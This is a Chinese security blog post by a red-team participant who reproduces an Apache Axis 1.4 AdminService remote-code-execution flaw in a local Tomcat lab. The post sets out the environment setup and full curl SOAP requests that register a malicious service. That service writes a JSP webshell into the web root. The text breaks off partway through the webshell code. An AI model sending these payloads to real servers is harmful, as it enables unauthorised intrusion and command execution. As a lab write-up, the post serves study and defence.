---
title: 第一次参加地市级攻防演练，我被这个 Axis 服务的“边界条件”上了一课
url: https://mp.weixin.qq.com/s/TZsNWmSgrkh0_DVb3iqhSw
source: Doonsec's feed
date: 2026-05-17
fetch_date: 2026-05-18T06:09:12.638135
---

# 第一次参加地市级攻防演练，我被这个 Axis 服务的“边界条件”上了一课

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/wIGVBqrREoaW7hZKkAuCzly8lzLOonagSa99VCtGGm9t27RqHeU193ORagQaiatUAK3dcU211r5cFNGxURnuIBPRXBogr0OI0lhNgrIRACJo/0?wx_fmt=jpeg)

# 第一次参加地市级攻防演练，我被这个 Axis 服务的“边界条件”上了一课

原创

SKillLab
SKillLab

SkillLab

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/sz_mmbiz_png/giaH4bTW3BOn7HPhfCMVxA0xejnkZnrB7IzGmjhJgJiaZOqicg7CFjrT9RpRjGhAgRjQmzq3mxicx4Omb2qFBFLP4Q/640)

![](https://mmbiz.qpic.cn/mmbiz_png/yE70PlBSEozVzTlePtQiashoYBKamZxNpJ51KxAQrTo1uNYOmLQxWs5GWialAxToZvVxIm7ic31Bw4WEM8icL4dDog/640)

本文内容仅用于 技术**交流**

互联网不是法外之地，请严格遵守《网络安全法》

![](https://mmbiz.qpic.cn/sz_mmbiz_png/0R0gH979OQm5DPYX5ibxXe5qQhhHPuj3jWWRNSfSJ4IRal5yNkjTjcDVezJ3y6xzHYqlVUhwTW1HvqX5CFzmlOg/640)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/qDqAuCnIXITRGeD5aouLKbXRJia0uSyY5EPCes7mMPeKNc22Tv4trYWibW7ta9xujbnmSBa04z1kIyFd65Fa6GqA/640)

01

前言

近期，我作为红队成员参加了某地市级的网络攻防演练。由于签署了保密协议，演练的具体成果在此不便展示。

这是我第一次以红队视角参与实战攻防。在之前的OSCP学习中，核心考点往往侧重于后渗透、内网横向与权限提升；但在真实的演练中，我深刻体会到“信息打点”才是整个红队攻击链的基石。

在演练结束前的最后3小时，我偶遇了一个Axis服务，敏锐地感觉到可能存在漏洞。然而在实战中却屡屡碰壁：Webshell无法上传、LDAP虽有出网交互但无法加载Payload、尝试各种常规指令均无法获取权限。这种“看得见却打不进去”的挫败感让我十分郁闷。

演练结束后，我立即在本地复现并搭建了环境，通过死磕原理才发现：该漏洞的成功利用，其实暗含了许多严苛的边界条件。以下是本次针对Apache Axis 1.4漏洞复现与流量分析的完整总结。

02

漏洞介绍

漏洞本质是管理员对AdminService的配置错误。当Axis的enableRemoteAdmin属性被设置为true时，攻击者可以构造恶意WebService调用，利用FreeMarker组件中的freemarker.template.utility.Execute类，远程通过AdminService接口发布新的WebService。随后，通过访问新生成的WebService接口并传入系统命令，即可实现远程命令执行（RCE）。

03

环境搭建准备

2.1下载所需组件

在复现前，需准备好Tomcat容器、Axis核心包以及FreeMarker组件：

```
#下载Tomcat 9.0、Axis 1.4和FreeMarkerhttps://tomcat.apache.org/download-90.cgihttps://link.zhihu.com/?target=https%3A//mirrors.tuna.tsinghua.edu.cn/apache/axis/axis/java/1.4/axis-bin-1_4.tar.gzhttp://maven.wso2.org/nexus/content/groups/wso2-public/org/freemarker/freemarker/2.3.28/freemarker-2.3.28.jar
```

2.2部署Tomcat

解压并启动Tomcat服务：

```
#解压并启动Tomcatunzip apache-tomcat-9.0.118-windows-x64.zip./startup.sh
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/wIGVBqrREobJeYuhWTMia4RADpKQVnWhCw1DrtOOEe2swfN6D1HmuTDztXKnicuaLPhMibqGwexkQVIOJNApAu7xCzGOMAD1dqdBqpGAtKxrt8/640?wx_fmt=other&from=appmsg)

```
#验证Tomcat是否运行成功ps aux | grep java
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/wIGVBqrREoYybJxTiasXPpsEmIQDZ84jPicxdLObaVicH0SaEUQtX0AsB5FSA1jPHLISzKIau8JicUKnsUYvWibJvt7Tuw1qnnu7VibG60xNItyec/640?wx_fmt=other&from=appmsg)

2.3配置管理员账户（可选）

注：Tomcat9+默认未配置Web管理员账户。虽然此处的账户配置与Axis漏洞利用本身并无直接关联，但由于在演练中没能成功打入，出于对新版Tomcat默认安全配置的好奇，我在本地顺便进行了配置与验证。

```
vim /Desktop/apache-tomcat-9.0.118/conf/tomcat-users.xml
<role rolename="manager-gui"/><role rolename="admin-gui"/><user username="admin" password="123456" roles="manager-gui,admin-gui"/>
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/wIGVBqrREoac64NZk4ZkvicjYS1NbGWtYdF7MSFia8lAj8UQIOcNOAejjTYn0iajbqsLicITDCl4QxQr3VLatThaz3VD0gZQkU7O05YCQ8eLU1w/640?wx_fmt=other&from=appmsg)

配置完成后，重启Tomcat使配置生效：

```
#重启tomcat./shutdown.sh./startup.sh
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/wIGVBqrREoae1ddJSpuYCTvQCHYwxiaBNsI95Hppm6WhmwhfRzhUXSf4YBcnYu1JrUfs55QVdlrrUAYS3OzLCGlINXFjXxPUx2R9FcWATsiaQ/640?wx_fmt=other&from=appmsg)

访问管理页面验证配置是否成功。（配置管理员账户对于次漏洞复现并没有用处，只是我比较奇新版的账户密码是什么，因为我在护网的时候打不进去）

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/wIGVBqrREobkJzxNicWbuibthFV96Ku2yFZScyKMrsz3BDablfdxXukBjyibf1EtCTug1onqrDSxmng2hxoqtO8jibgS6xceWwzlQGggFHDiajRo/640?wx_fmt=other&from=appmsg)

2.4部署Axis和FreeMarker

tomcat服务部署好以后，接下来部署Axis服务（可通过注册服务上传Webshell）与FreeMarker环境（通过模板框架实现无文件命令执行）：

```
#解压Axis并复制到Tomcat webapps目录
tar -zxvf axis-bin-1_4.tar.gz
cp -r axis-1_4/webapps/axis ~/Desktop/apache-tomcat-9.0.118/webapps/
#复制FreeMarker JAR包到Axis库目录
cp freemarker-2.3.28.jar ~/Desktop/apache-tomcat-9.0.118/webapps/axis/WEB-INF/lib/
#重启Tomcat
./shutdown.sh && ./startup.sh
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/wIGVBqrREobR7YgfJO8LWSyEKwSqm1ERRf2Ga2lvdEfbdRBX2ov1PCIf7Rt4qbr1cK6LPRvMwlUzBpKXnTzuWc4ZU25DFDgXnszju4Enwqw/640?wx_fmt=other&from=appmsg)

04

漏洞复现

针对该漏洞，主要有两种主流的利用方式：Webshell落地与FreeMarker不落盘直接执行。

3.1方式一：上传Webshell

漏洞原理

攻击者通过POST请求向services/AdminService部署一个恶意的WebService。该服务会被写入server-config.wsdd配置文件中。利用Axis自带的LogHandler写入日志功能，配合目录穿越（相对路径），将请求包中的恶意JSP代码强行刷新到Web根目录下。

攻击流程

```
┌─────────────────────────────────────────────────────────────────┐
│第一步：通过AdminService部署恶意服务                             │
│ POST /axis/services/AdminService                                │
│   →创建RandomService（每次请求触发RandomLog）                   │
│   →创建RandomLogHandler（写入../webapps/ROOT/shell.jsp）       │
└─────────────────────────────────────────────────────────────────┘
                                            ↓
┌─────────────────────────────────────────────────────────────────┐
│第二步：触发RandomService写入Webshell                            │
│ POST /axis/services/RandomService                               │
│   → RandomLog Handler被触发                                     │
│   →将请求中的JSP代码写入shell.jsp                               │
└─────────────────────────────────────────────────────────────────┘
                                            ↓
┌─────────────────────────────────────────────────────────────────┐
│第三步：访问Webshell执行命令                                     │
│ GET /shell.jsp?c=whoami                                         │
│   →服务器执行whoami并返回结果                                   │
└─────────────────────────────────────────────────────────────────┘
```

手动攻击

Step1：部署恶意写文件服务

向services/AdminService发送SOAP请求，注册一个名为RandomService的服务，并将其日志输出路径指定为Web根目录下的shell.jsp。

```
curl -X POST "http://localhost:8080/axis/services/AdminService"   -H "Content-Type: application/xml"   -H "SOAPAction: something"   -d '<?xml version="1.0" encoding="utf-8"?><soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"        xmlns:xsd="http://www.w3.org/2001/XMLSchema"        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">  soapenv:Body    <ns1:deployment  xmlns="http://xml.apache.org/axis/wsdd/"  xmlns:java="http://xml.apache.org/axis/wsdd/providers/java"  xmlns:ns1="http://xml.apache.org/axis/wsdd/">  <ns1:service name="RandomService" provider="java:RPC">    <requestFlow>      <handler type="RandomLog"/>    </requestFlow>    <ns1:parameter name="className" value="java.util.Random"/>    <ns1:parameter name="allowedMethods" value="*"/>  /ns1:service  <handler name="RandomLog" type="java:org.apache.axis.handlers.LogHandler" >    <parameter name="LogHandler.fileName" value="../webapps/ROOT/shell.jsp" />    <parameter name="LogHandler.writeToConsole" value="false" />  </handler>/ns1:deployment  /soapenv:Body/soapenv:Envelope'
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/wIGVBqrREoY8LiaZJOiaxgdIrpccJPcJ37XZubUpq0Bw9icfsz7ydRzOsD5sMs03CedK3MmiaREeaiaianpEh2esib8txlIuIgYzTSu0c5AmnczLVE/640?wx_fmt=other&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/wIGVBqrREoazE8L0P1PRTMp6TjRkPeGOxApDtk98eUiaYy8LML6q5lyDsjNebL0ZwIBFyBSlxZibCPkUrr65hyG8bicuia3CrQbVOtsia56K33tc/640?wx_fmt=other&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/wIGVBqrREobnuGzLT9wqs9R8oFKNoqx4PqIMe5vWCXa8949YQz2GKUwaUIdzVwFOG9tSk50TmKJuBQ8WYjqCGxKsppHdY1V27iaoibeHgVvJI/640?wx_fmt=other&from=appmsg)

Step2：调用新服务写入Webshell

向刚刚创建的RandomService发起请求。由于目的只是为了让LogHandler记录下请求内容，即便此时服务器因找不到对应的方法而返回500 Error，恶意代码也已经成功落盘。

```
curl -X POST "http://localhost:8080/axis/services/RandomService"   -H "Content-Type: application/xml"   -H "SOAPAction: something"   -d '<?xml version="1.0" encoding="utf-8"?>        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"        xmlns:xsd="http://www.w3.org/2001/XMLSchema"        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">        soapenv:Body        <api:main        soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">            api:in0<![CDATA[<%@page import="java.util.*,java.io.*"%><% if (request.getParameter("c") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("c")); DataInputStream dis = new Dat...